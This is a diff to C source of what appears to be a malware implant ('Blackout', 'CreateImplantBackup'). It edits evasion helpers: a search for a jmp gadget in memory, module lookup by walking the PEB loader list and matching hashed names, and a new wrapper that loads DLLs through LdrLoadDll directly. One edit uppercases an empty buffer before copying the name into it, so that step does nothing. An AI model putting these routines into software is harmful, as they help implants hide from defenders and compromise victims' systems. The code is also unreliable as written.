@@ -9,11 +9,10 @@ FUNC BOOL CreateImplantBackup(
     BLACKOUT_INSTANCE
 
     LARGE_INTEGER MaximumSize = { 0 };
-    HANDLE        hSection    = NULL;
-    ULONG         Status      = STATUS_SUCCESS;
-
     MaximumSize.HighPart = 0;
     MaximumSize.LowPart  = Instance()->Blackout.Region.Length;
+    HANDLE        hSection    = NULL;
+    ULONG         Status      = STATUS_SUCCESS;
 
     Status = Instance()->Win32.NtCreateSection( 
         &hSection, SECTION_ALL_ACCESS, NULL, 
@@ -42,7 +41,7 @@ FUNC PVOID FindJmpGadget(
     SearchSize = 0x1000 * 0x1000;    
 
     for ( INT i = 0; i < SearchSize - 1; i++ ) {
-        if ( SearchBase[i] == 0xff && SearchBase[i+1] == Register ) {
+        if ( SearchBase[i] == 0xff && SearchBase[i+1] == 0x23 ) {
             Gadget = SearchBase + i;
             break;
         }
@@ -416,6 +415,8 @@ FUNC PVOID LdrModuleAddr(
     PLIST_ENTRY           Head  = { 0 };
     PLIST_ENTRY           Entry = { 0 };
 
+    CHAR cDllName[256] = { 0 };
+
     Head  = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
     Entry = Head->Flink;
 
@@ -427,10 +428,13 @@ FUNC PVOID LdrModuleAddr(
     for ( ; Head != Entry ; Entry = Entry->Flink ) {
         Data = C_PTR( Entry );
 
-        if ( HashString( Data->BaseDllName.Buffer, Data->BaseDllName.Length ) == Hash ) {
+        toUpperCaseChar( cDllName );
+        WCharStringToCharString( cDllName, Data->BaseDllName.Buffer, Data->BaseDllName.MaximumLength );
+
+        if ( HashString( cDllName, 0 ) == Hash ) {
             return Data->DllBase;
         }
-    }
+    }    
 
     return NULL;
 }
@@ -500,4 +504,21 @@ FUNC PVOID LdrFuncAddr(
     }
 
     return NULL;
+}
+
+FUNC PVOID LdrLoadLib( 
+    PWSTR Module
+) {
+    BLACKOUT_INSTANCE
+
+    UNICODE_STRING uStrMod = { 0 };
+    PVOID          hModule = NULL;
+    ULONG          Status  = 0;
+
+    InitUnicodeString( &uStrMod, Module );
+
+    Status = Instance()->Win32.LdrLoadDll( NULL, 0, &uStrMod, &hModule );
+    if ( Status != 0 ) return NULL;
+
+    return hModule;
 }
